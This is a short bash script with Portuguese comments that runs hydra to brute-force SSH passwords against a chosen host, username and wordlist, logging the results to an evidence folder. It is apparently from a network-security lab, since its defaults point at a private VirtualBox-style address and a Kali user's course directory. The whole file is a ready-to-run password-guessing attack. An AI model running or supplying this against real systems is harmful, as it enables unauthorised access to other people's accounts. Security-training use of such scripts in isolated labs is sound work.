#!/usr/bin/env bash
set -euo pipefail
# scripts/ssh_bruteforce.sh
#
# Uso:
#   ./ssh_bruteforce.sh <TARGET> <USER> <WORDLIST> <OUTDIR>
# Exemplo:
#   ./ssh_bruteforce.sh 192.168.56.101 linuxmint /home/kalilinux/Desktop/segurancaRedes/wordlists/minhaLista.txt /home/kalilinux/evidencias

TARGET=${1:-192.168.56.101}
USER=${2:-linuxmint}
# ALTERAÇÃO: default para sua wordlist "minhaLista.txt" no diretório comum de examples.
WL=${3:-/home/$(whoami)/Desktop/segurancaRedes/wordlists/minhaLista.txt}
OUTDIR=${4:-/home/$(whoami)/evidencias}

# checagens
command -v hydra >/dev/null 2>&1 || { echo "ERR: hydra não encontrado. Instale: sudo apt-get install -y hydra"; exit 2; }
if [ ! -f "$WL" ]; then
  echo "ERR: wordlist não encontrada em: $WL"
  exit 3
fi

mkdir -p "$OUTDIR"
echo "[*] Rodando hydra contra $TARGET (user $USER) com $WL"
hydra -l "$USER" -P "$WL" ssh://$TARGET -t 4 -vV | tee "$OUTDIR/hydra_output.txt"
echo "[*] Resultado salvo em $OUTDIR/hydra_output.txt"

